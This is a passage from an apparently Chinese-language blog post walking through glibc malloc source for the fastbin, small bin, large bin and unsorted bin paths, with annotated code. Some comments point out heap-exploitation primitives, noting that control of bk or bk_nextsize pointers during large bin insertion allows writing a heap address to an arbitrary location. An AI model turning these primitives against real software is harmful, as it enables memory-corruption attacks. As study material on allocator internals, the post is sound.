&#125;</span><br></pre></td></tr></table></figure><p>得到可以分配的内存之后，首先判断<code>size</code>的大小是否符合<code>fastbin</code>的大小范围，最大的<code>fastbin</code>是通过全局变量<code>global_max_fast</code>来表示的。在这一部分，首先获取<code>size</code>大小在<code>fastbin</code>链表中的表示相应大小的<code>fastbin</code>的链表头指针，即<code>fb</code>与<code>pp</code>。判断当前所在的链表中是否存在相应大小的<code>fastbin chunk</code>。若不存在则跳出<code>fastbin</code>分配函数，去申请相应大小的<code>smallbin</code>。</p><p>若链表非空，则分配第一个<code>chunk</code>。注意这里检查了所分配的<code>chunk</code>的<code>size</code>与当前<code>fastbin</code>链表所表示的<code>size</code>的大小是否相同，若不相同则调用<code>malloc_printerr</code>函数打印错误信息。接着调用了<code>check_remalloced_chunk</code>函数对<code>chunk</code>结构体的一些标志位做了检查，主要检查了该<code>chunk</code>是否是<code>malloc_state</code>所表示的分配区中的，检查这块<code>chunk</code>是否已经分配，是否重复分配和一些大小的检查。</p><h4 id="small-bin"><a href="#small-bin" class="headerlink" title="small bin"></a>small bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"> <span class="keyword">if</span> (in_smallbin_range (nb))</span><br><span class="line">   &#123;</span><br><span class="line">     idx = smallbin_index (nb);</span><br><span class="line">     bin = bin_at (av, idx);</span><br><span class="line">     <span class="comment">//last(b) ((b)-&gt;bk)</span></span><br><span class="line">     <span class="keyword">if</span> ((victim = last (bin)) != bin)</span><br><span class="line">       &#123;</span><br><span class="line">         <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">           malloc_consolidate (av);</span><br><span class="line">         <span class="keyword">else</span></span><br><span class="line">           &#123;</span><br><span class="line">             bck = victim-&gt;bk;</span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely (bck-&gt;fd != victim))</span><br><span class="line">               &#123;</span><br><span class="line">                 errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                 <span class="keyword">goto</span> errout;</span><br><span class="line">               &#125;</span><br><span class="line">             set_inuse_bit_at_offset (victim, nb);</span><br><span class="line">             bin-&gt;bk = bck;</span><br><span class="line">             bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">             <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">               victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">             check_malloced_chunk (av, victim, nb);</span><br><span class="line">             <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">             alloc_perturb (p, bytes);</span><br><span class="line">             <span class="keyword">return</span> p;</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>先判断<code>size</code>的大小是否符合<code>smallbin</code>的范围内，若符合<code>small bin</code>的大小范围则在<code>malloc_state</code>结构体中找到与其对应大小的<code>small bin</code>数组的起始地址。接着判断该<code>small bin</code>链表是否为空（从这里可以看出，初始化的<code>small bin</code>的<code>bk</code>指针是指向自身的。</p><p>若链表不为空且链表中存储有相应大小的<code>chunk</code>，将链表尾部的<code>chunk</code>分配出去，从分配的链表指针变化我们可以看出，链表头部的<code>bk</code>指针指向的是链表尾部的<code>chunk</code>，链表尾部<code>chunk</code>的<code>fd</code>指针指向链表头部。在分配之前还会确认该<code>chunk</code>的链表指针是否正确，相当于检查了<code>victim-&gt;bk-&gt;fd!=victim</code>。分配完毕之后会对<code>chunk</code>结构体的标志位做一些检查，这里和<code>fastbin</code>的检查相似。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">__glibc_unlikely (bck-&gt;fd != victim)</span><br></pre></td></tr></table></figure><p>这里的特殊情况就是<code>small bin</code>没有初始化，此时所有的指针均为空，这时程序就会调用<a href="#malloc_consolidate">malloc_consolidate</a>函数将<code>fastbin</code>链表中的所有的<code>chunk</code>进行合并，并将合并后的<code>chunk</code>插入到<code>unsorted bin</code>中。</p><h4 id="large-bin"><a href="#large-bin" class="headerlink" title="large bin"></a>large bin</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">    idx = largebin_index (nb);</span><br><span class="line">    <span class="keyword">if</span> (have_fastchunks (av))</span><br><span class="line">        malloc_consolidate (av);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>若不符合<code>small bin</code>的大小，则获取用户申请大小的<code>size</code>所在的<code>large bin</code>数组的下标，并将<code>fastbin</code>进行合并，并插入到<code>unsorted bin</code>链表中。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))&#123;</span><br><span class="line">    bck = victim-&gt;bk;</span><br><span class="line">    <span class="keyword">if</span> (__builtin_expect (victim-&gt;size &lt;= <span class="number">2</span> * SIZE_SZ, <span class="number">0</span>)</span><br><span class="line">        || __builtin_expect (victim-&gt;size &gt; av-&gt;system_mem, <span class="number">0</span>))</span><br><span class="line">        malloc_printerr (check_action, <span class="string">&quot;malloc(): memory corruption&quot;</span>,</span><br><span class="line">                         chunk2mem (victim), av);</span><br><span class="line">    size = chunksize (victim);</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先通过判断<code>unsorted bin</code>不为空的情况，若链表不为空，则从链表的尾部开始对链表中的<code>chunk</code>进行处理。这里首先判断了<code>chunk</code>的<code>size</code>的大小是否合法，若合法则获取<code>chunk size</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (in_smallbin_range (nb) &amp;&amp;</span><br><span class="line">    bck == unsorted_chunks (av) &amp;&amp;</span><br><span class="line">    victim == av-&gt;last_remainder &amp;&amp;</span><br><span class="line">    (<span class="type">unsigned</span> <span class="type">long</span>) (size) &gt; (<span class="type">unsigned</span> <span class="type">long</span>) (nb + MINSIZE))</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">/* split and reattach remainder */</span></span><br><span class="line">    remainder_size = size - nb;</span><br><span class="line">    remainder = chunk_at_offset (victim, nb);</span><br><span class="line">    unsorted_chunks (av)-&gt;bk = unsorted_chunks (av)-&gt;fd = remainder;</span><br><span class="line">    av-&gt;last_remainder = remainder;</span><br><span class="line">    remainder-&gt;bk = remainder-&gt;fd = unsorted_chunks (av);</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">    &#123;</span><br><span class="line">        remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">        remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_head (victim, nb | PREV_INUSE |</span><br><span class="line">              (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">    set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">    set_foot (remainder, remainder_size);</span><br><span class="line"></span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果用户申请的<code>chunk</code>的大小属于<code>small bin</code>的范围内，并且<code>unsorted bin</code>链表中只有一个<code>chunk</code>并指向<code>last_remainder</code>，且该<code>chunk</code>的<code>size</code>大小大于用户申请的<code>size</code>大小，就将该<code>chunk</code>拆分为两个<code>chunk</code>，将符合用户申请大小的<code>chunk</code>返回，拆分之后剩余的<code>chunk</code>插入到<code>unsorted bin</code>链表中，更新<code>last_remainder</code>。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">unsorted_chunks (av)-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = unsorted_chunks (av);</span><br></pre></td></tr></table></figure><p>否则就将当前的<code>chunk</code>从<code>unsorted bin</code>链表中摘除，这里实现了一个类似于<a href="#unlink">unlink</a>的操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (size == nb)</span><br><span class="line">&#123;</span><br><span class="line">    set_inuse_bit_at_offset (victim, size);</span><br><span class="line">    <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">        victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">    check_malloced_chunk (av, victim, nb);</span><br><span class="line">    <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">    alloc_perturb (p, bytes);</span><br><span class="line">    <span class="keyword">return</span> p;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>如果用户申请的<code>size</code>的大小恰好与当前<code>chunk</code>的大小相同，则将当前的<code>chunk</code>返回。否则就将当前的<code>chunk</code>插入到<code>bins</code>中</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range (size))</span><br><span class="line">    &#123;</span><br><span class="line">        victim_index = smallbin_index (size);</span><br><span class="line">        bck = bin_at (av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">        victim_index = largebin_index (size);</span><br><span class="line">        bck = bin_at (av, victim_index);</span><br><span class="line">        fwd = bck-&gt;fd;</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">        <span class="comment">/* maintain large bins in sorted order */</span></span><br><span class="line">        <span class="keyword">if</span> (fwd != bck)<span class="comment">// largebin链表不为空</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">/* Or with inuse bit to speed comparisons */</span></span><br><span class="line">            size |= PREV_INUSE;</span><br><span class="line">            <span class="comment">/* if smaller than smallest, bypass loop below */</span></span><br><span class="line">            assert ((bck-&gt;bk-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">            <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) (size) &lt; (<span class="type">unsigned</span> <span class="type">long</span>) (bck-&gt;bk-&gt;size))</span><br><span class="line">            &#123;<span class="comment">//当前堆块的大小小于最小的堆块，则将当前堆块插入到链表的尾部</span></span><br><span class="line">                fwd = bck;<span class="comment">//指向链表最后一个堆块</span></span><br><span class="line">                bck = bck-&gt;bk;</span><br><span class="line"></span><br><span class="line">                victim-&gt;fd_nextsize = fwd-&gt;fd;</span><br><span class="line">                victim-&gt;bk_nextsize = fwd-&gt;fd-&gt;bk_nextsize;</span><br><span class="line">                <span class="comment">//将链表首堆块的bk_nextsize和原链表最后一个堆块的fd_nextsize指向当前的chunk</span></span><br><span class="line">                fwd-&gt;fd-&gt;bk_nextsize = victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;<span class="comment">//将当前的chunk插入到largebin链表中的合适位置</span></span><br><span class="line">                assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                <span class="keyword">while</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size &lt; fwd-&gt;size)<span class="comment">//查找合适的位置</span></span><br><span class="line">                &#123;</span><br><span class="line">                    fwd = fwd-&gt;fd_nextsize;</span><br><span class="line">                    assert ((fwd-&gt;size &amp; NON_MAIN_ARENA) == <span class="number">0</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">//此时fwd指向的是大小恰好小于等于当前chunk的堆块</span></span><br><span class="line">                <span class="keyword">if</span> ((<span class="type">unsigned</span> <span class="type">long</span>) size == (<span class="type">unsigned</span> <span class="type">long</span>) fwd-&gt;size)</span><br><span class="line">                 <span class="comment">//当前大小的chunk数组不为空，则将当前堆块插入到数组的第二个位置中，插入的操作在之后进行</span></span><br><span class="line">                 <span class="comment">//因为插入到此位置不用修改数组的首堆块的fd_nextsize和bk_nextsize</span></span><br><span class="line">                    <span class="comment">/* Always insert in the second position.  */</span></span><br><span class="line">                    fwd = fwd-&gt;fd;</span><br><span class="line">                <span class="keyword">else</span></span><br><span class="line">                &#123;</span><br><span class="line">                    victim-&gt;fd_nextsize = fwd;</span><br><span class="line">                    victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;</span><br><span class="line">                    fwd-&gt;bk_nextsize = victim;</span><br><span class="line">                    victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;</span><br><span class="line">                    <span class="comment">//上一条语句相当于fwd-&gt;bk_nextsize-&gt;fd_nextsize=victim;</span></span><br><span class="line">                    <span class="comment">//如果我们控制了fwd指向的即大小恰好小于当前堆块的bk_nextsize的内容，就可以在改地址的+0x20处写入堆地址</span></span><br><span class="line">                &#125;</span><br><span class="line">                bck = fwd-&gt;bk;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span><span class="comment">//largebin链表为空则只需要加入链表即可</span></span><br><span class="line">            victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//上面我们只对不同大小的largebin数组进行链表的链接，还需要在大小相同的largebin chunk组成的数组中进行插入</span></span><br><span class="line">    mark_bin (av, victim_index);</span><br><span class="line">    victim-&gt;bk = bck;</span><br><span class="line">    victim-&gt;fd = fwd;</span><br><span class="line">    fwd-&gt;bk = victim;</span><br><span class="line">    bck-&gt;fd = victim;<span class="comment">//该语句相当于fwd-&gt;bk-&gt;fd=victim;如果我们控制了fwd的bk指针就可以在任意地址+0x10写入堆地址</span></span><br><span class="line"></span><br><span class="line">    <span class="meta">#<span class="keyword">define</span> MAX_ITERS       10000</span></span><br><span class="line">    <span class="keyword">if</span> (++iters &gt;= MAX_ITERS)</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>首先是获得<code>chunk size</code>所对应的<code>bins</code>中的列表的头指针，也就是<code>chunk</code>需要插入的地址。由于<code>large chunk</code>列表中的<code>chunk</code>的<code>size</code>大小并不一定相同，因此在获取插入位置的时候需要进行遍历链表，以保持<code>large bin</code>中的有序状态。在这个过程中并对指向上一个或下一个大小不同的<code>chunk</code>的<code>bk_nextsize，fd_nextsize</code>进行赋值。在得到头指针和<code>index</code>之后，设置<code>bitmap</code>并将该<code>chunk</code>插入到相应的链表中。最后的<code>break</code>的含义是为了防止<code>unsorted bin</code>中的<code>chunk</code>太多，而导致一直处理<code>unsorted bin</code>中<code>chunk</code>的情况。</p><blockquote><p>从这里也可以看出，<code>largebin</code>链表是从大到小排列的，也就是链表尾部的<code>chunk</code>的<code>size</code>是最小的。</p><p>这里存在任意地址写入堆地址的漏洞</p></blockquote><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )&#123;</span><br><span class="line">    <span class="keyword">while</span> ((victim = unsorted_chunks (av)-&gt;bk) != unsorted_chunks (av))&#123;</span><br><span class="line">        <span class="comment">//处理unsorted bin</span></span><br><span class="line">        <span class="comment">//分配small bin</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (!in_smallbin_range (nb))</span><br><span class="line">    &#123;</span><br><span class="line">        bin = bin_at (av, idx);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* skip scan if empty or largest chunk is too small */</span></span><br><span class="line">        <span class="keyword">if</span> ((victim = first (bin)) != bin &amp;&amp;</span><br><span class="line">            (<span class="type">unsigned</span> <span class="type">long</span>) (victim-&gt;size) &gt;= (<span class="type">unsigned</span> <span class="type">long</span>) (nb))</span><br><span class="line">        &#123;</span><br><span class="line">            victim = victim-&gt;bk_nextsize;</span><br><span class="line">            <span class="keyword">while</span> (((<span class="type">unsigned</span> <span class="type">long</span>) (size = chunksize (victim)) &lt;</span><br><span class="line">                    (<span class="type">unsigned</span> <span class="type">long</span>) (nb)))</span><br><span class="line">                victim = victim-&gt;bk_nextsize;</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Avoid removing the first entry for a size so that the skip</span></span><br><span class="line"><span class="comment">                 list does not have to be rerouted.  */</span></span><br><span class="line">            <span class="keyword">if</span> (victim != last (bin) &amp;&amp; victim-&gt;size == victim-&gt;fd-&gt;size)</span><br><span class="line">                victim = victim-&gt;fd;</span><br><span class="line"></span><br><span class="line">            remainder_size = size - nb;</span><br><span class="line">            unlink (av, victim, bck, fwd);</span><br><span class="line"></span><br><span class="line">            <span class="comment">/* Exhaust */</span></span><br><span class="line">            <span class="keyword">if</span> (remainder_size &lt; MINSIZE)</span><br><span class="line">            &#123;</span><br><span class="line">                set_inuse_bit_at_offset (victim, size);</span><br><span class="line">                <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line">                    victim-&gt;size |= NON_MAIN_ARENA;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">/* Split */</span></span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                remainder = chunk_at_offset (victim, nb);</span><br><span class="line">                <span class="comment">/* We cannot assume the unsorted list is empty and therefore</span></span><br><span class="line"><span class="comment">                     have to perform a complete insert here.  */</span></span><br><span class="line">                bck = unsorted_chunks (av);</span><br><span class="line">                fwd = bck-&gt;fd;</span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely (fwd-&gt;bk != bck))</span><br><span class="line">                &#123;</span><br><span class="line">                    errstr = <span class="string">&quot;malloc(): corrupted unsorted chunks&quot;</span>;</span><br><span class="line">                    <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">                remainder-&gt;bk = bck;</span><br><span class="line">                remainder-&gt;fd = fwd;</span><br><span class="line">                bck-&gt;fd = remainder;</span><br><span class="line">                fwd-&gt;bk = remainder;</span><br><span class="line">                <span class="keyword">if</span> (!in_smallbin_range (remainder_size))</span><br><span class="line">                &#123;</span><br><span class="line">                    remainder-&gt;fd_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                    remainder-&gt;bk_nextsize = <span class="literal">NULL</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                set_head (victim, nb | PREV_INUSE |</span><br><span class="line">                          (av != &amp;main_arena ? NON_MAIN_ARENA : <span class="number">0</span>));</span><br><span class="line">                set_head (remainder, remainder_size | PREV_INUSE);</span><br><span class="line">                set_foot (remainder, remainder_size);</span><br><span class="line">            &#125;</span><br><span class="line">            check_malloced_chunk (av, victim, nb);</span><br><span class="line">            <span class="type">void</span> *p = chunk2mem (victim);</span><br><span class="line">            alloc_perturb (p, bytes);</span><br><span class="line">            <span class="keyword">return</span> p;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来开始在<code>bins</code>数组中寻找合适的<code>chunk</code>，如果用户申请的<code>chunk</code>位于<code>large bin</code>的范围内，且其对应的链表中存在符合要求的<code>chunk</code>（这里的符合要求是指用户申请的<code>chunk size</code>大小小于链表中最大的<code>chunk</code>。</p><p>那么从链表尾部开始，即从最小的<code>chunk</code>开始，寻找最符合用户申请大小的<code>chunk</code>，即恰好大于等于用户申请大小的<code>chunk</code>。将符合要求的<code>chunk</code>拆分，如果拆分剩余的<code>chunk</code>的<code>size</code>大小没有办法组成一个<code>chunk</code>的话，则不进行拆分，直接返回较大的<code>chunk</code>。否则将拆分之后的<code>chunk</code>插入到<code>unsorted bin</code>中，注意的是这里进行了<code>double free</code>的检查<code>if (__glibc_unlikely (fwd-&gt;bk != bck))</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;; )&#123;</span><br><span class="line">    <span class="comment">//处理unsorted bin，分配small bin</span></span><br><span class="line">    <span class="comment">//处理用户申请的size所对应的large bin中存在符合要求的chunk的情况</span></span><br><span class="line">    ++idx;</span><br><span class="line">    bin = bin_at (av, idx);</span><br><span class="line">    block = idx2block (idx);</span><br><span class="line">    <span class="built_in">map</span> = av-&gt;binmap[block];</span><br><span class="line">    bit = idx2bit (idx);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (;; )</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">/* Skip rest of block if there are no more set bits in this block.  */</span></span><br><span class="line">        <span class="comment">//根据block找到存在空闲chunk的large bin链表</span></span><br><span class="line">        <span class="keyword">if</span> (bit &gt; <span class="built_in">map</span> || bit == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">do</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">if</span> (++block &gt;= BINMAPSIZE) <span class="comment">/* out of bins */</span></span><br><span class="line">                    <span class="keyword">goto</span> use_top;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">while</span> ((<span class="built_in">map</span> = av-&gt;binmap[block]) == <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">            bin = bin_at (av, (block &lt;&lt; BINMAPSHIFT));</span><br><span class="line">            bit = <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Advance to bin with set bit. There must be one. */</span></span><br><span class="line">        <span class="comment">//在block中找到的存在符合要求的large bin链表的头指针</span></span><br><span class="line">        <span class="keyword">while</span> ((bit &amp; <span class="built_in">map</span>) == <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            bin = next_bin (bin);</span><br><span class="line">            bit &lt;&lt;= <span class="number">1</span>;</span><br><span class="line">            assert (bit != <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">/* Inspect the bin. It is likely to be non-empty */</span></span><br><span class="line">        victim = last (bin);</span><br><span class="line"></span><br><span class="line">        <span class="comment">/*  If a false alarm (empty bin), clear the bit. */</span></span><br><span class="line">        <span class="keyword">if</span> (victim == bin)</span><br><span class="line">        &#123;</span><br><span class="line">            